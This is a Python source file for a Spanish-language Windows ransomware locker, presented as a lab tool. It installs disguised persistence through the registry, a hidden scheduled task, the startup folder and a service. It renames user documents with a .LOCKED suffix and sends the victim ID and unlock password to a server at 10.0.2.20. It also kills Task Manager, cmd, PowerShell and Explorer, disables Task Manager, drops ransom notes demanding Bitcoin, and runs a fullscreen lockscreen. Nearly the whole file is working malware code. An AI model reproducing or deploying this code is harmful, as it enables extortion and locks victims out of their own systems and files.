import os
import sys
import random
import string
import requests
import time
import subprocess
import ctypes
import threading
import winreg
import getpass
from pathlib import Path

class RansomwarePersistente:
    def __init__(self):
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures'
        ]
        
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)', 'System32',
            'Windows.old', 'Recovery', '$Recycle.Bin'
        ]
        
        self.kali_ip = "10.0.2.20"
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = f'http://{self.kali_ip}/victima.php'
        self.encryption_count = 0
        self.password = None
        self.victim_id = None
        self.script_path = os.path.abspath(__file__)
        
    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def show_banner(self):
        """Muestra el banner ASCII"""
        banner = """
         _nnnn_        
        dGGGGMMb       
       @p~qp~~qMb      
       M|@||@) M|      
       @,----.JM|      
      JS^\\__/  qKL     
     dZP        qKRb   
    dZP          qKKb  
   fZP            SMMb 
   HZM            MMMM 
   FqM            MMMM 
 __| \".        |\\dS\"qML
 |    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'  
     `-'       `--' hjm
 _              
| |             
| |_ _   ___  __
| __| | | \\ \\/ /
| |_| |_| |>  < 
 \\__|\\__,_/_/\\_\\      _____                   
|_   _| __ __ _ _ __ ___ 
  | || '__/ _` | '_ ` _ \\
  | || | | (_| | | | | | |
  |_||_|  \\__,_|_| |_| |_|

==================================================
        TU INFORMACION A SIDO SECUESTRADA
==================================================
"""
        print(banner)

    def install_persistence(self):
        """Instala multiples metodos de persistencia"""
        print("[*] Instalando persistencia...")
        
        try:
            # Metodo 1: Registro de Windows - Run
            self._install_registry_persistence()
            
            # Metodo 2: Tareas Programadas
            self._install_scheduled_task()
            
            # Metodo 3: Carpeta Startup
            self._install_startup_folder()
            
            # Metodo 4: Servicio de Windows (si es admin)
            if self.is_admin():
                self._install_windows_service()
                
            print("[+] Persistencia instalada correctamente")
            return True
            
        except Exception as e:
            print("[-] Error instalando persistencia:", e)
            return False

    def _install_registry_persistence(self):
        """Instala persistencia en el registro de Windows"""
        try:
            # Current User Run
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, f'"{sys.executable}" "{self.script_path}"')
            print("   [+] Persistencia en registro (HKCU) instalada")
            
        except Exception as e:
            print("   [-] Error en registro HKCU:", e)

    def _install_scheduled_task(self):
        """Crea una tarea programada"""
        try:
            task_name = "WindowsDefenderUpdate"
            task_xml = f'''
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Defender Update Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>{getpass.getuser()}</UserId>
      <LogonType>InteractiveToken</LogonType>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"{sys.executable}"</Command>
      <Arguments>"{self.script_path}"</Arguments>
    </Exec>
  </Actions>
</Task>
'''
            # Guardar XML temporalmente
            xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
            with open(xml_path, 'w') as f:
                f.write(task_xml)
            
            # Crear tarea
            subprocess.run([
                'schtasks', '/create', '/tn', task_name, 
                '/xml', xml_path, '/f'
            ], capture_output=True, shell=True)
            
            # Limpiar
            os.remove(xml_path)
            print("   [+] Tarea programada instalada")
            
        except Exception as e:
            print("   [-] Error en tarea programada:", e)

    def _install_startup_folder(self):
        """Copia el script a la carpeta de inicio"""
        try:
            startup_folder = os.path.join(
                os.path.expanduser('~'),
                'AppData',
                'Roaming',
                'Microsoft',
                'Windows',
                'Start Menu',
                'Programs',
                'Startup'
            )
            
            if os.path.exists(startup_folder):
                target_path = os.path.join(startup_folder, 'WindowsUpdate.exe')
                
                # Si estamos ejecutando desde un .py, compilar a .exe seria ideal
                # Por ahora copiamos el script y creamos un batch
                bat_content = f'@echo off\n"{sys.executable}" "{self.script_path}"\n'
                bat_path = os.path.join(startup_folder, 'WindowsUpdate.bat')
                
                with open(bat_path, 'w') as f:
                    f.write(bat_content)
                    
                # Ocultar archivo
                subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
                print("   [+] Persistencia en carpeta Startup instalada")
                
        except Exception as e:
            print("   [-] Error en carpeta Startup:", e)

    def _install_windows_service(self):
        """Instala como servicio de Windows (requiere admin)"""
        try:
            service_name = "WindowsDefenderUpdate"
            
            # Usar sc para crear el servicio
            subprocess.run([
                'sc', 'create', service_name,
                f'binpath= "{sys.executable} {self.script_path}"',
                'start= auto',
                'displayname= "Windows Defender Update Service"'
            ], capture_output=True, shell=True)
            
            print("   [+] Servicio de Windows instalado")
            
        except Exception as e:
            print("   [-] Error instalando servicio:", e)

    def check_persistence(self):
        """Verifica si ya hay persistencia instalada"""
        try:
            # Verificar registro
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
                try:
                    value, _ = winreg.QueryValueEx(reg_key, "WindowsUpdateService")
                    if os.path.abspath(__file__) in value:
                        return True
                except FileNotFoundError:
                    pass
                    
            return False
            
        except:
            return False

    def expand_paths(self):
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        return expanded_dirs if expanded_dirs else ['.']

    def should_encrypt(self, filepath):
        file_str = str(filepath).lower()
        
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        
        try:
            if filepath.stat().st_size < 100:
                return False
        except:
            return False
            
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                          '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi',
                          '.zip', '.rar', '.odt', '.ppt', '.pptx']
        
        return any(file_str.endswith(ext) for ext in valid_extensions)

    def generate_keys(self):
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 30))
        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 10))

    def test_connection(self):
        """Testea la conexion con el servidor Kali"""
        print("[*] Probando conexion con Kali Linux (" + self.kali_ip + ")...")
        try:
            result = os.system(f"ping -n 1 {self.kali_ip} >nul 2>nul")
            if result == 0:
                print("[+] Kali Linux responde al ping")
            else:
                print("[-] Kali Linux NO responde al ping")
                return False
            
            response = requests.get(f'http://{self.kali_ip}/victima.php', timeout=5)
            print("[+] Servidor web respondio:", response.status_code)
            return True
            
        except requests.exceptions.ConnectionError:
            print("[-] No se puede conectar al servidor web")
            return False
        except Exception as e:
            print("[-] Error de conexion:", e)
            return False

    def send_credentials(self):
        """Envia credenciales al servidor Kali"""
        print("[*] Enviando credenciales a " + self.url + "...")
        try:
            values = {'pass': self.password, 'id': self.victim_id}
            response = requests.post(self.url, data=values, timeout=10)
            
            if response.text.strip() == 'Ok.':
                print("[+] Credenciales enviadas exitosamente")
                print("   ID: " + self.victim_id)
                print("   Password: " + self.password)
                return True
            else:
                print("[-] Respuesta inesperada:", response.text)
                self.save_credentials_local()
                return False
                
        except Exception as e:
            print("[-] Error enviando credenciales:", e)
            self.save_credentials_local()
            return False

    def save_credentials_local(self):
        """Guarda credenciales localmente"""
        try:
            with open('CREDENCIALES_LOCALES.txt', 'w') as f:
                f.write(f"ID: {self.victim_id}\n")
                f.write(f"PASSWORD: {self.password}\n")
                f.write(f"BITCOIN: {self.bitcoin}\n")
                f.write(f"PRICE: ${self.price}\n")
            print("[+] Credenciales guardadas en CREDENCIALES_LOCALES.txt")
        except:
            pass

    def encrypt_file_windows(self, filepath):
        try:
            if not self.should_encrypt(filepath):
                return False
                
            new_name = str(filepath) + '.LOCKED'
            os.rename(filepath, new_name)
            self.encryption_count += 1
            return True
                
        except:
            return False

    def encrypt_directory(self, directory):
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file_windows(filepath):
                        encrypted_files += 1
            return encrypted_files
        except:
            return 0

    def create_ransom_note(self):
        note = f"""
================================================================
                    !!! SISTEMA BLOQUEADO !!!
================================================================

TU INFORMACION HA SIDO SECUESTRADA

         _nnnn_        
        dGGGGMMb       
       @p~qp~~qMb      
       M|@||@) M|      
       @,----.JM|      
      JS^\\__/  qKL     
     dZP        qKRb   
    dZP          qKKb  
   fZP            SMMb 
   HZM            MMMM 
   FqM            MMMM 
 __| \".        |\\dS\"qML
 |    `.       | `' \\Zq
_)      \\.___.,|     .'
\\____   )MMMMMP|   .'  
     `-'       `--' hjm

INFORMACION PARA LA RECUPERACION:
* ID Unico: {self.victim_id}
* Pago Requerido: ${self.price} en Bitcoin
* Direccion Bitcoin: {self.bitcoin}

ADVERTENCIAS:
* EL SISTEMA SE REINICIARA AUTOMATICAMENTE SI LO APAGA
* NO REINSTALE EL SISTEMA - LA INFECCION PERSISTIRA
* NO INTENTE DESCIFRAR LOS ARCHIVOS MANUALMENTE

Para recuperar sus archivos, ingrese la clave de descifrado a continuacion:
"""
        
        locations = [
            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
            os.path.expanduser('~/Documents/INSTRUCCIONES.txt'),
            'C:/INSTRUCCIONES.txt'
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
                print("[+] Nota de rescate creada en: " + location)
            except:
                pass

    def kill_system_tools(self):
        """Mata todas las herramientas del sistema"""
        tools = [
            'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe',
            'explorer.exe', 'msconfig.exe', 'compmgmt.msc', 'perfmon.exe',
            'eventvwr.exe', 'services.msc', 'control.exe', 'mmc.exe'
        ]
        
        for tool in tools:
            try:
                os.system(f'taskkill /f /im {tool} 2>nul')
            except:
                pass

    def disable_task_manager(self):
        """Deshabilita el administrador de tareas"""
        try:
            os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul')
        except:
            pass

    def create_black_screen(self):
        """Crea la pantalla negra de bloqueo completo"""
        black_screen_code = f'''
import tkinter as tk
import tkinter.messagebox as messagebox
import sys
import os
import subprocess
import threading
import time

class FullScreenBlocker:
    def __init__(self):
        self.root = tk.Tk()
        self.setup_ui()
        self.start_monitoring()
        
    def setup_ui(self):
        # Pantalla completa
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")
        self.root.bind("<Key>", self.on_key_press)
        self.root.bind("<Button>", self.on_click)
        
        # Frame principal
        main_frame = tk.Frame(self.root, bg="black")
        main_frame.pack(expand=True, fill="both", padx=50, pady=50)
        
        # Banner ASCII
        banner_text = """
         _nnnn_        
        dGGGGMMb       
       @p~qp~~qMb      
       M|@||@) M|      
       @,----.JM|      
      JS^\\\\__/  qKL     
     dZP        qKRb   
    dZP          qKKb  
   fZP            SMMb 
   HZM            MMMM 
   FqM            MMMM 
 __| \\".        |\\\\dS\\"qML
 |    `.       | `' \\\\Zq
_)      \\\\.___.,|     .'
\\\\____   )MMMMMP|   .'  
     `-'       `--' hjm

  TU INFORMACION HA SIDO SECUESTRADA
        """
        
        title = tk.Label(
            main_frame,
            text=banner_text,
            font=("Courier", 10),
            fg="red",
            bg="black",
            justify="left"
        )
        title.pack(pady=10)
        
        # Mensaje
        message = tk.Label(
            main_frame,
            text="FALTA REPARAR LA CONEXION\\nSISTEMA PERSISTENTE - SE REINICIARA AUTOMATICAMENTE",
            font=("Arial", 16),
            fg="white",
            bg="black"
        )
        message.pack(pady=10)
        
        # ID de victima
        victim_id = tk.Label(
            main_frame,
            text=f"ID: {self.victim_id}",
            font=("Arial", 14, "bold"),
            fg="yellow",
            bg="black"
        )
        victim_id.pack(pady=10)
        
        # Frame de entrada
        input_frame = tk.Frame(main_frame, bg="black")
        input_frame.pack(pady=30)
        
        tk.Label(
            input_frame,
            text="Ingrese la clave de descifrado:",
            font=("Arial", 12),
            fg="white",
            bg="black"
        ).pack()
        
        self.password_entry = tk.Entry(
            input_frame,
            font=("Arial", 14),
            width=40,
            show="*"
        )
        self.password_entry.pack(pady=10)
        self.password_entry.focus()
        
        # Boton de verificacion
        verify_btn = tk.Button(
            input_frame,
            text="VERIFICAR CLAVE",
            font=("Arial", 12, "bold"),
            bg="red",
            fg="white",
            command=self.verify_password,
            width=20,
            height=2
        )
        verify_btn.pack(pady=10)
        
        # Contador
        self.counter = 0
        self.counter_label = tk.Label(
            main_frame,
            text="Tiempo bloqueado: 0 segundos",
            font=("Arial", 10),
            fg="gray",
            bg="black"
        )
        self.counter_label.pack(side="bottom", pady=10)
        
    def on_key_press(self, event):
        if event.keysym in ["Escape", "Alt_L", "Alt_R", "F1", "F2", "F3", "F4", "F11", "F12", "Super_L", "Super_R"]:
            return "break"
            
    def on_click(self, event):
        return "break"
        
    def verify_password(self):
        password = self.password_entry.get()
        if password == "{self.password}":
            self.unlock_system()
        else:
            messagebox.showerror("Error", "Clave incorrecta. Sistema permanece bloqueado.")
            self.password_entry.delete(0, tk.END)
            
    def unlock_system(self):
        try:
            subprocess.Popen(["python", "DECRYPT_FILES.py"])
        except:
            pass
        self.root.destroy()
        sys.exit()
        
    def update_counter(self):
        self.counter += 1
        self.counter_label.config(text=f"Tiempo bloqueado: {{self.counter}} segundos")
        self.root.after(1000, self.update_counter)
        
    def start_monitoring(self):
        def monitor():
            while True:
                try:
                    os.system("taskkill /f /im taskmgr.exe 2>nul")
                    os.system("taskkill /f /im cmd.exe 2>nul")
                    os.system("taskkill /f /im powershell.exe 2>nul")
                    time.sleep(1)
                except:
                    pass
                    
        thread = threading.Thread(target=monitor)
        thread.daemon = True
        thread.start()
        
        self.update_counter()
        
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    blocker = FullScreenBlocker()
    blocker.run()
'''
        
        try:
            with open('black_screen.py', 'w', encoding='utf-8') as f:
                f.write(black_screen_code)
        except:
            pass

    def start_black_screen(self):
        """Inicia la pantalla negra"""
        try:
            subprocess.Popen([sys.executable, 'black_screen.py'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

    def create_decryptor(self):
        decrypt_script = f'''import os
import shutil

VICTIM_ID = "{self.victim_id}"
PASSWORD = "{self.password}"

def main():
    print("Sistema de Recuperacion de Archivos")
    print("===================================")
    print(f"ID de victima: {{VICTIM_ID}}")
    
    input_password = input("Ingrese la clave de descifrado: ")
    
    if input_password != PASSWORD:
        print("Clave incorrecta. Sistema permanece bloqueado.")
        input("Presione Enter para salir...")
        return
        
    print("Clave verificada. Descifrando archivos y removiendo persistencia...")
    
    # Descifrar archivos
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.LOCKED'):
                encrypted_files.append(os.path.join(root, file))
    
    success_count = 0
    for enc_file in encrypted_files:
        try:
            original_file = enc_file[:-7]
            os.rename(enc_file, original_file)
            success_count += 1
            print(f"[+] Recuperado: {{os.path.basename(original_file)}}")
        except Exception as e:
            print(f"[-] Error con {{os.path.basename(enc_file)}}: {{e}}")
    
    # Remover persistencia
    print("\\n[*] Removiendo persistencia...")
    try:
        import winreg
        # Remover del registro
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                winreg.DeleteValue(reg_key, "WindowsUpdateService")
                print("[+] Persistencia del registro removida")
            except:
                pass
                
        # Remover tarea programada
        os.system('schtasks /delete /tn "WindowsDefenderUpdate" /f 2>nul')
        print("[+] Tarea programada removida")
        
        # Remover archivos temporales
        files_to_remove = ["black_screen.py", "LEAME_URGENTE.txt", "INSTRUCCIONES.txt", "CREDENCIALES_LOCALES.txt"]
        for file in files_to_remove:
            if os.path.exists(file):
                os.remove(file)
                print(f"[+] Archivo {{file}} removido")
                
    except Exception as e:
        print(f"[-] Error removiendo persistencia: {{e}}")
    
    print(f"\\n[+] Proceso completado!")
    print(f"[*] Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
    print("\\n[+] Sistema completamente recuperado y limpio!")
    input("Presione Enter para salir...")

if __name__ == "__main__":
    main()
'''
        
        try:
            with open('DECRYPT_FILES.py', 'w') as f:
                f.write(decrypt_script)
        except:
            pass

    def execute_complete_lockdown(self):
        """Ejecuta el bloqueo completo del sistema"""
        self.show_banner()
        print("[*] INICIANDO BLOQUEO COMPLETO PERSISTENTE")
        print("=" * 50)
        
        # Verificar si ya esta instalado
        if self.check_persistence():
            print("[*] El ransomware ya esta instalado en el sistema")
            print("[*] Activando modo de ejecucion persistente...")
        else:
            # Instalar persistencia en la primera ejecucion
            print("[*] Instalando persistencia...")
            self.install_persistence()
        
        # Paso 1: Configurar conexion
        print("\\n[1/5] Configurando conexion...")
        connection_ok = self.test_connection()
        
        if not connection_ok:
            respuesta = input("¿Continuar sin conexion? (s/n): ")
            if respuesta.lower() != 's':
                print("Ejecucion cancelada.")
                return
        
        # Paso 2: Generar claves
        print("\\n[2/5] Generando claves...")
        self.generate_keys()
        
        # Paso 3: Enviar credenciales
        if connection_ok:
            print("\\n[3/5] Enviando credenciales...")
            self.send_credentials()
        else:
            print("\\n[3/5] Guardando credenciales localmente...")
            self.save_credentials_local()
        
        # Paso 4: Cifrar archivos
        print("\\n[4/5] Cifrando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        for directory in directories:
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print("   " + directory + ": " + str(encrypted) + " archivos")
        
        # Paso 5: Bloquear sistema
        print("\\n[5/5] Activando bloqueo completo...")
        self.create_ransom_note()
        self.create_decryptor()
        self.create_black_screen()
        
        self.kill_system_tools()
        self.disable_task_manager()
        self.start_black_screen()
        
        print("[+] SISTEMA BLOQUEADO PERSISTENTEMENTE")
        print("[*] Archivos cifrados: " + str(total_encrypted))
        print("[*] Clave: " + self.password)
        print("[*] El sistema se reactivara automaticamente tras reinicios")
        
        # Bloqueo continuo
        while True:
            self.kill_system_tools()
            time.sleep(2)

if __name__ == "__main__":
    ransomware = RansomwarePersistente()
    ransomware.show_banner()
    
    print("RANSOMWARE PERSISTENTE - LABORATORIO")
    print("SOLO PARA ENTORNOS CONTROLADOS")
    print("=" * 50)
    
    # Verificar si es ejecucion automatica (sin confirmacion)
    auto_mode = len(sys.argv) > 1 and sys.argv[1] == "auto"
    
    if not auto_mode:
        confirm = input("¿Continuar? (escribe 'BLOQUEAR'): ")
        if confirm != "BLOQUEAR":
            print("Ejecucion cancelada.")
            sys.exit()
    
    try:
        ransomware.execute_complete_lockdown()
    except KeyboardInterrupt:
        print("\\n[*] Ejecucion interrumpida")
    except Exception as e:
        print("\\n[-] Error:", e)
